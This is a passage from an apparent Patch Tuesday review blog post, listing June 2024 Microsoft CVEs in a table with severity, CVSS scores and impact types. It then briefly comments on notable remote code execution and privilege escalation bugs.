  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-37325"><span><span> </span>CVE-2024-37325 †</span></a></td>
  <td class="xl66" width="263"><span> </span>Azure Science Virtual Machine (DSVM)
  Elevation of Privilege Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">9.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35252"><span><span> </span>CVE-2024-35252<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Azure Storage Movement Client Library Denial
  of Service Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.5</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">DoS</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30070"><span><span> </span>CVE-2024-30070<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>DHCP Server Service Denial of Service
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.5</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">DoS</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-29187"><span><span> </span>CVE-2024-29187 *</span></a></td>
  <td class="xl66" width="263"><span> </span>GitHub: CVE-2024-29187 WiX Burn-based
  bundles are vulnerable to binary hijack when run as SYSTEM<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.3</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35253"><span><span> </span>CVE-2024-35253<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Microsoft Azure File Sync Elevation of
  Privilege Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">4.4</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35263"><span><span> </span>CVE-2024-35263<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Microsoft Dynamics 365 (On-Premises)
  Information Disclosure Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">5.7</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">Info</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35248"><span><span> </span>CVE-2024-35248<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Microsoft Dynamics 365 Business Central
  Elevation of Privilege Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.3</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35249"><span><span> </span>CVE-2024-35249<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Microsoft Dynamics 365 Business Central
  Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">8.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30072"><span><span> </span>CVE-2024-30072<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Microsoft Event Trace Log File Parsing
  Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30104"><span><span> </span>CVE-2024-30104<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Microsoft Office Remote Code Execution
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30101"><span><span> </span>CVE-2024-30101<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Microsoft Office Remote Code Execution
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.5</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30102"><span><span> </span>CVE-2024-30102<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Microsoft Office Remote Code Execution
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.3</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30103"><span><span> </span>CVE-2024-30103<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Microsoft Outlook Remote Code Execution
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">8.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30100"><span><span> </span>CVE-2024-30100<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Microsoft SharePoint Server Remote Code
  Execution Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="101">
  <td class="xl75" height="101"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30097"><span><span> </span>CVE-2024-30097<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Microsoft Speech Application Programming
  Interface (SAPI) Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">8.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30089"><span><span> </span>CVE-2024-30089<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Microsoft Streaming Service Elevation of
  Privilege Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30090"><span><span> </span>CVE-2024-30090<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Microsoft Streaming Service Elevation of
  Privilege Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-50868"><span><span> </span>CVE-2023-50868 *</span></a></td>
  <td class="xl66" width="263"><span> </span>MITRE: CVE-2023-50868 NSEC3 closest encloser
  proof can exhaust CPU<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.5</td>
  <td class="xl68"><span> </span>Yes<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">DoS</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-29060"><span><span> </span>CVE-2024-29060<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Visual Studio Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">6.7</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30052"><span><span> </span>CVE-2024-30052<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Visual Studio Remote Code Execution
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">4.7</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30082"><span><span> </span>CVE-2024-30082<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Win32k Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30087"><span><span> </span>CVE-2024-30087<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Win32k Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30091"><span><span> </span>CVE-2024-30091<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Win32k Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30085"><span><span> </span>CVE-2024-30085<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Cloud Files Mini Filter Driver
  Elevation of Privilege Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30076"><span><span> </span>CVE-2024-30076<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Container Manager Service Elevation
  of Privilege Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">6.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30096"><span><span> </span>CVE-2024-30096<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Cryptographic Services Information
  Disclosure Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">5.5</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">Info</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30063"><span><span> </span>CVE-2024-30063<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Distributed File System (DFS) Remote
  Code Execution Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">6.7</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30064"><span><span> </span>CVE-2024-30064<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Kernel Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">8.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30068"><span><span> </span>CVE-2024-30068<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Kernel Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">8.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30088"><span><span> </span>CVE-2024-30088<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Kernel Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30099"><span><span> </span>CVE-2024-30099<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Kernel Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35250"><span><span> </span>CVE-2024-35250<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Kernel-Mode Driver Elevation of
  Privilege Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30084"><span><span> </span>CVE-2024-30084<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Kernel-Mode Driver Elevation of
  Privilege Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30074"><span><span> </span>CVE-2024-30074<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Link Layer Topology Discovery
  Protocol Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30075"><span><span> </span>CVE-2024-30075<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Link Layer Topology Discovery
  Protocol Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30077"><span><span> </span>CVE-2024-30077<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows OLE Remote Code Execution
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-35265"><span><span> </span>CVE-2024-35265<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Perception Service Elevation of
  Privilege Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30069"><span><span> </span>CVE-2024-30069<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Remote Access Connection Manager
  Information Disclosure Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">4.7</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">Info</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30094"><span><span> </span>CVE-2024-30094<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Routing and Remote Access Service
  (RRAS) Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30095"><span><span> </span>CVE-2024-30095<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Routing and Remote Access Service
  (RRAS) Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30083"><span><span> </span>CVE-2024-30083<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Standards-Based Storage Management
  Service Denial of Service Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.5</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">DoS</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30062"><span><span> </span>CVE-2024-30062<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Standards-Based Storage Management
  Service Remote Code Execution Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30093"><span><span> </span>CVE-2024-30093<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Storage Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.3</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30065"><span><span> </span>CVE-2024-30065<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Themes Denial of Service
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">5.5</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">DoS</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30078"><span><span> </span>CVE-2024-30078<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Wi-Fi Driver Remote Code Execution
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">8.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30086"><span><span> </span>CVE-2024-30086<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Windows Win32 Kernel Subsystem Elevation of
  Privilege Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">7.8</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30066"><span><span> </span>CVE-2024-30066<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>Winlogon Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">5.5</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="48">
  <td class="xl75" height="48"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30067"><span><span> </span>CVE-2024-30067<span> </span></span></a></td>
  <td class="xl66" width="263"><span> </span>WinLogon Elevation of Privilege
  Vulnerability<span> </span></td>
  <td class="xl71"><span> </span>Important<span> </span></td>
  <td class="xl67">5.5</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">EoP</td>
 </tr>
 <tr height="51">
  <td class="xl75" height="51"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-5493"><span><span> </span>CVE-2024-5493 *</span></a></td>
  <td class="xl66" width="263"><span> </span>Chromium: CVE-2024-5493 Heap buffer overflow
  in WebRTC<span> </span></td>
  <td class="xl69"><span> </span>High</td>
  <td class="xl67"><span> </span>N/A</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="51">
  <td class="xl75" height="51"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-5494"><span><span> </span>CVE-2024-5494 *</span></a></td>
  <td class="xl66" width="263"><span> </span>Chromium: CVE-2024-5494 Use after free in
  Dawn<span> </span></td>
  <td class="xl69"><span> </span>High</td>
  <td class="xl67"><span> </span>N/A</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="51">
  <td class="xl75" height="51"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-5495"><span><span> </span>CVE-2024-5495 *</span></a></td>
  <td class="xl66" width="263"><span> </span>Chromium: CVE-2024-5495 Use after free in
  Dawn<span> </span></td>
  <td class="xl69"><span> </span>High</td>
  <td class="xl67"><span> </span>N/A</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="51">
  <td class="xl75" height="51"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-5496"><span><span> </span>CVE-2024-5496 *</span></a></td>
  <td class="xl66" width="263"><span> </span>Chromium: CVE-2024-5496 Use after free in
  Media Session<span> </span></td>
  <td class="xl69"><span> </span>High</td>
  <td class="xl67"><span> </span>N/A</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="76">
  <td class="xl75" height="76"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-5497"><span><span> </span>CVE-2024-5497 *</span></a></td>
  <td class="xl66" width="263"><span> </span>Chromium: CVE-2024-5497 Out of bounds memory
  access in Keyboard Inputs<span> </span></td>
  <td class="xl69"><span> </span>High</td>
  <td class="xl67"><span> </span>N/A</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="51">
  <td class="xl75" height="51"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-5498"><span><span> </span>CVE-2024-5498 *</span></a></td>
  <td class="xl66" width="263"><span> </span>Chromium: CVE-2024-5498 Use after free in
  Presentation API<span> </span></td>
  <td class="xl69"><span> </span>High</td>
  <td class="xl67"><span> </span>N/A</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 <tr height="51">
  <td class="xl75" height="51"><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-5499"><span><span> </span>CVE-2024-5499 *</span></a></td>
  <td class="xl66" width="263"><span> </span>Chromium: CVE-2024-5499 Out of bounds write
  in Streams API<span> </span></td>
  <td class="xl69"><span> </span>High</td>
  <td class="xl67"><span> </span>N/A</td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67"><span> </span>No<span> </span></td>
  <td class="xl67">RCE</td>
 </tr>
 
 <tr height="0">
  <td width="151"></td>
  <td width="263"></td>
  <td width="111"></td>
  <td width="111"></td>
  <td width="111"></td>
  <td width="111"></td>
  <td width="95"></td>
 </tr>
 
</table>













  <p class=""><em>* Indicates this CVE had been released by a third party and is now being included in Microsoft releases</em>.</p><p class=""><em>† Indicates further administrative actions are required to fully address the vulnerability.</em></p><p class="">&nbsp;</p><p class="">Looking at the other fixes addressing code execution bugs, there are a couple that stand out. In addition to the Wi-Fi bug above, there are two similar bugs in the Link Layer Topology Discovery Protocol with similar exploit vectors. The difference is that for these two bugs, the target needs to be running the Network Map functionality for the attack to succeed. There are several “open-and-own” type vulnerabilities getting patched. The one to look out for would be the <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30101" target="_blank">Office bug</a> that states, “The Preview Pane is an attack vector, but additional user interaction is required.” It’s not clear how that would manifest. The exploit for DFS requires an adjacent attacker to already be executing code on a target, which reads more like an EoP to me. The OLE bug requires connecting to a malicious SQL server. The bug in the Speech Application Programming Interface (SAPI) requires a user to click a link to connect to the attacker’s server. Lastly, the code execution bug in Dynamics 365 requires authentication, which again sounds more like an EoP, but it also states no user interaction is required. It’s an odd write-up that implies it’s unlikely to be exploited in the wild.</p><p class="">More than half of this month’s release corrects privilege escalation bugs, but the majority of these lead to SYSTEM-level code execution if an authenticated user runs specially crafted code. Other privilege escalation bugs would allow the attacker to get to the level of the running application. The bugs in Winlogon are 